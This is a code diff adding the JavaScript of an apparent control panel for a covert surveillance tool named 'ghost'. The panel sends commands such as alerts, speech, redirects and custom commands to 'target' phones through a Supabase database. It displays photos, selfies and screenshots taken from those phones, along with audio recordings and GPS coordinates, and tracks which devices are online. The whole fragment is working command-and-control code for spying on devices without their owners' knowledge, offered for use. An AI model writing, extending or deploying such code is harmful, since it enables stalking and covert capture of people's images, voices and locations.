+  if (targetMode === 'one' && selectedDeviceId === 'all') {
+    showToast('⚠ Select a device first'); return;
+  }
+  const ok = await dbInsert('ghost_commands', {
+    device_id:  targetId,
+    command,
+    param,
+    executed:   false,
+    created_at: new Date().toISOString()
+  });
+  showToast(ok
+    ? `✅ ${command.toUpperCase()} → ${targetId === 'all' ? 'ALL' : targetId.replace('device_','').slice(0,12)}`
+    : '❌ Send failed — check Supabase connection'
+  );
+}
+
+function sendCustom() {
+  const v = document.getElementById('customIn').value.trim();
+  if (!v) return;
+  const parts = v.split(' ');
+  sendCmd(parts[0], parts.slice(1).join(' '));
+  document.getElementById('customIn').value = '';
+}
+
+function promptAlert() {
+  const m = prompt('Message to show on target device:');
+  if (m && m.trim()) sendCmd('alert', m.trim());
+}
+function promptSpeak() {
+  const m = prompt('Text to speak on target device:');
+  if (m && m.trim()) sendCmd('speak', m.trim());
+}
+function promptRedirect() {
+  const u = prompt('URL to open on target device:');
+  if (u && u.trim()) sendCmd('redirect', u.trim());
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  GALLERY
+//  FIX: null-check all DOM elements before accessing them
+// ═══════════════════════════════════════════════════════════════
+async function loadGallery() {
+  const cntEl = document.getElementById('galCnt');
+  if (cntEl) cntEl.textContent = 'Loading…';
+  const rows = await dbSelect('ghost_results', `type=in.(capture,selfie,screenshot)&order=created_at.desc&limit=200`);
+  allPhotos = (rows || []).filter(r => {
+    try { return !!JSON.parse(r.payload).image; } catch(e) { return false; }
+  });
+  renderGallery();
+}
+
+function renderGallery() {
+  const filter  = document.getElementById('galFilter');
+  const grid    = document.getElementById('galGrid');
+  const empty   = document.getElementById('galEmpty');
+  const cntEl   = document.getElementById('galCnt');
+  if (!filter || !grid || !empty || !cntEl) return;
+
+  const filterVal = filter.value;
+  const photos = filterVal === 'all' ? allPhotos : allPhotos.filter(p => p.type === filterVal);
+  grid.innerHTML = '';
+  if (!photos.length) {
+    grid.style.display   = 'none';
+    empty.style.display  = 'block';
+    cntEl.textContent    = '0 photos';
+    return;
+  }
+  grid.style.display   = 'grid';
+  empty.style.display  = 'none';
+  cntEl.textContent    = photos.length + ' photo' + (photos.length !== 1 ? 's' : '');
+
+  photos.forEach(row => {
+    let p = {};
+    try { p = JSON.parse(row.payload); } catch(e) {}
+    const lbl  = row.type === 'selfie' ? '🤳 SELFIE' : row.type === 'screenshot' ? '🖥 SCREEN' : '📷 REAR';
+    const time = new Date(row.created_at).toLocaleString([], { month:'short', day:'numeric', hour:'2-digit', minute:'2-digit' });
+    const dev  = row.device_id.replace('device_','').slice(0, 10);
+    const item = document.createElement('div');
+    item.className = 'g-item';
+    item.onclick   = () => openLb(row, p);
+    item.innerHTML = `
+      <img src="${p.image}" alt="capture" loading="lazy">
+      <div class="g-item-info">
+        <div class="g-type">${lbl}</div>
+        <div class="g-time">${time}</div>
+        <div class="g-dev">${dev}</div>
+      </div>`;
+    grid.appendChild(item);
+  });
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  LIGHTBOX
+// ═══════════════════════════════════════════════════════════════
+function openLb(row, payload) {
+  curLbPhoto = { row, payload };
+  document.getElementById('lbImg').src     = payload.image;
+  const lbl = row.type === 'selfie' ? '🤳 Selfie' : row.type === 'screenshot' ? '🖥 Screenshot' : '📷 Rear Camera';
+  document.getElementById('lbTitle').textContent = lbl;
+  document.getElementById('lbMeta').textContent  =
+    new Date(row.created_at).toLocaleString() + ' · ' + row.device_id +
+    (payload.w ? ' · ' + payload.w + '×' + payload.h : '') +
+    (payload.burst ? ` · Shot ${payload.shot}/${payload.total}` : '');
+  document.getElementById('lb').classList.add('open');
+}
+function closeLb() { document.getElementById('lb').classList.remove('open'); curLbPhoto = null; }
+function dlCurrentPhoto() {
+  if (!curLbPhoto) return;
+  const a = document.createElement('a');
+  a.href     = curLbPhoto.payload.image;
+  a.download = `ghost_${curLbPhoto.row.type}_${Date.now()}.jpg`;
+  a.click();
+  showToast('📥 Saving…');
+}
+document.getElementById('lb').addEventListener('click', e => {
+  if (e.target === document.getElementById('lb')) closeLb();
+});
+function openLbById(id) {
+  const d = window._feedPhotos[id];
+  if (d) openLb(d.row, d.payload);
+}
+function dlPhotoById(id) {
+  const d = window._feedPhotos[id];
+  if (!d) return;
+  const a = document.createElement('a');
+  a.href     = d.payload.image;
+  a.download = `ghost_${d.row.type}_${Date.now()}.jpg`;
+  a.click();
+  showToast('📥 Saving…');
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  LIVE FEED RENDER
+// ═══════════════════════════════════════════════════════════════
+function renderFeedItem(row) {
+  let p = {};
+  try { p = JSON.parse(row.payload); } catch(e) {}
+  const list  = document.getElementById('feedList');
+  if (!list) return;
+  const empty = list.querySelector('.f-empty');
+  if (empty) empty.remove();
+
+  const isPhoto   = ['capture','selfie','screenshot'].includes(row.type);
+  const badgeCls  = isPhoto ? 'photo' : row.type === 'location' ? 'location' : row.type === 'audio' ? 'audio' : '';
+  let bodyHtml = '';
+
+  if (isPhoto && p.image) {
+    const pid = 'photo_' + row.id;
+    window._feedPhotos[pid] = { row, payload: p };
+    bodyHtml = `
+      <img class="f-img" src="${p.image}" alt="capture" onclick="openLbById('${pid}')">
+      ${p.facing ? `<div style="font-size:10px;color:#555;margin-top:4px;">Cam: ${p.facing}${p.w?' · '+p.w+'×'+p.h:''}${p.burst?' · Burst '+p.shot+'/'+p.total:''}</div>` : ''}
+      <button class="save-btn" onclick="dlPhotoById('${pid}')">⬇ Save</button>`;
+
+  } else if (row.type === 'audio' && p.audio) {
+    bodyHtml = `<audio class="f-audio" controls src="${p.audio}"></audio>
+      <div style="font-size:9px;color:#555;margin-top:4px;">Duration: ${p.duration}s · ${p.mime || 'audio/webm'}</div>`;
+
+  } else if (row.type === 'location' && p.lat !== undefined) {
+    bodyHtml = `
+      <div>📍 ${p.lat.toFixed(6)}, ${p.lng.toFixed(6)}</div>
+      <div style="font-size:10px;color:#666;">±${Math.round(p.accuracy||0)}m · Speed: ${p.speed != null ? p.speed+'m/s' : 'N/A'}</div>
+      <a class="loc-link" href="${p.maps}" target="_blank" rel="noopener">Open Maps ↗</a>`;
+
+  } else if (p.error) {
+    bodyHtml = `<div style="color:var(--warn);font-size:11px;">⚠ ${p.error}</div>`;
+  } else {
+    bodyHtml = `<pre>${JSON.stringify(p, null, 2)}</pre>`;
+  }
+
+  const devShort = (row.device_id || '').replace('device_', '').slice(0, 12);
+  const item = document.createElement('div');
+  item.className = 'f-item';
+  item.innerHTML = `
+    <div class="f-meta">
+      <span class="f-badge ${badgeCls}">${row.type.toUpperCase()}</span>
+      <span class="f-time">${new Date(row.created_at).toLocaleTimeString()}</span>
+    </div>
+    <div class="f-dev">🖥 ${devShort}</div>
+    <div class="f-body">${bodyHtml}</div>`;
+  list.prepend(item);
+}
+
+function clearFeed() {
+  const list = document.getElementById('feedList');
+  if (list) list.innerHTML = '<div class="f-empty">Feed cleared.</div>';
+  window._feedPhotos = {};
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  DEVICES PANEL + MINI BAR
+// ═══════════════════════════════════════════════════════════════
+async function pollDevices() {
+  const devs = await dbSelect('ghost_devices', `order=last_seen.desc&limit=30`);
+  const list  = document.getElementById('deviceList');
+  const bar   = document.getElementById('devBar');
+  const onlineEl = document.getElementById('statOnline');
+  const totalEl  = document.getElementById('statTotal');
+
+  // FIX: guard for when elements don't exist yet (panel not visited)
+  if (!list || !bar) return;
+
+  if (!devs || !devs.length) {
+    list.innerHTML = '<div class="no-devs">No devices registered yet.<br>Open the Target file on another phone.</div>';
+    bar.innerHTML  = '<div class="dev-mini-empty">No devices</div>';
+    if (onlineEl) onlineEl.textContent = '0';
+    if (totalEl)  totalEl.textContent  = '0';
+    return;
+  }
+
+  let onlineCnt = 0;
+  list.innerHTML = '';
+  bar.innerHTML  = '';
+
+  devs.forEach(d => {
+    const age    = Math.floor((Date.now() - new Date(d.last_seen)) / 1000);
+    const online = age < 50;
+    if (online) onlineCnt++;
+
+    const timeStr = age < 60 ? age + 's ago'
+                  : age < 3600 ? Math.floor(age/60) + 'm ago'
+                  : Math.floor(age/3600) + 'h ago';
+    const short   = (d.device_id || '').replace('device_','');
+    const isSel   = d.device_id === selectedDeviceId;
+
+    let batStr = '';
+    if (d.battery) {
+      try { const b = JSON.parse(d.battery); batStr = b.level ? `🔋 ${b.level}${b.charging?' ⚡':''}` : ''; } catch(e) {}
+    }
+    const card = document.createElement('div');
+    card.className  = 'dev-card' + (online ? ' online' : '') + (isSel ? ' selected' : '');
+    card.dataset.id = d.device_id;
+    card.onclick    = () => selectDevice(d.device_id);
+    card.innerHTML  = `
+      <span class="dev-icon">${online ? '📱' : '💀'}</span>
+      <div style="flex:1;min-width:0">
+        <div class="dev-id">${short.slice(0,16)}</div>
+        <div class="dev-seen">Last: ${timeStr}</div>
+        ${batStr ? `<div class="dev-bat">${batStr}</div>` : ''}
+      </div>
+      <div class="dev-pill ${online ? '' : 'offline'}">${online ? 'ONLINE' : 'OFFLINE'}</div>`;
+    list.appendChild(card);
+
+    const mini = document.createElement('div');
+    mini.className  = `dev-mini ${online ? 'online' : 'offline'}${isSel ? ' selected' : ''}`;
+    mini.dataset.id = d.device_id;
+    mini.onclick    = () => selectDevice(d.device_id);
+    mini.innerHTML  = `<div class="dm-dot"></div>${short.slice(0,8)}`;
+    bar.appendChild(mini);
+  });
+
+  if (onlineEl) onlineEl.textContent = onlineCnt;
+  if (totalEl)  totalEl.textContent  = devs.length;
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  RESULT POLLING
+//  FIX: updateGalleryBadge uses span element rather than
+//       overwriting innerHTML (which wiped the emoji)
+// ═══════════════════════════════════════════════════════════════
+async function pollResults() {
+  const rows = await dbSelect('ghost_results', `id=gt.${lastResultId}&order=id.asc&limit=50`);
+  if (!rows || !rows.length) return;
+  rows.forEach(r => {
+    renderFeedItem(r);
+    if (r.id > lastResultId) lastResultId = r.id;
+  });
+  const newPhotos = rows.filter(r => ['capture','selfie','screenshot'].includes(r.type));
+  if (newPhotos.length) {
+    newPhotoCnt += newPhotos.length;
+    const galTab = document.getElementById('tab-gallery');
+    if (galTab && !document.getElementById('panel-gallery').classList.contains('active')) {
+      // FIX: append a badge span instead of replacing innerHTML
+      let badgeEl = galTab.querySelector('.badge');
+      if (!badgeEl) {
+        badgeEl = document.createElement('span');
+        badgeEl.className = 'badge';
+        galTab.appendChild(badgeEl);
+      }
+      badgeEl.textContent = `+${newPhotoCnt}`;
+    } else {
+      loadGallery();
+    }
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  CONNECTION CHECK
+//  FIX: HDR object now includes Content-Type consistently
+// ═══════════════════════════════════════════════════════════════
+async function checkConn() {
+  const dotEl  = document.getElementById('liveDot');
+  const txtEl  = document.getElementById('connTxt');
+  try {
+    const r  = await fetch(`${SUPABASE_URL}/rest/v1/ghost_devices?limit=1`, { headers: HDR });
+    const ok = r.ok;
+    if (txtEl) txtEl.textContent = ok ? 'LIVE' : 'DB ERR';
+    if (dotEl) dotEl.classList.toggle('err', !ok);
+  } catch(e) {
+    if (txtEl) txtEl.textContent = 'OFFLINE';
+    if (dotEl) dotEl.classList.add('err');
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  TOAST
+// ═══════════════════════════════════════════════════════════════
+function showToast(msg) {
+  document.querySelector('.toast')?.remove();
+  const t = document.createElement('div');
+  t.className   = 'toast';
+  t.textContent = msg;
+  document.body.appendChild(t);
+  setTimeout(() => t?.remove(), 2800);
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  BOOTSTRAP
+// ═══════════════════════════════════════════════════════════════
+async function bootstrap() {
+  // Seed result cursor so we only show new results going forward
+  try {
+    const rows = await dbSelect('ghost_results', `order=id.desc&limit=1`);
+    if (rows && rows.length) lastResultId = rows[0].id;
+  } catch(e) {}
+
+  checkConn();
+  pollDevices();
+
+  setInterval(pollResults,  3000);
+  setInterval(pollDevices, 10000);
+  setInterval(checkConn,   30000);
+}
+
+bootstrap();
+</script>
+</body>
+</html>
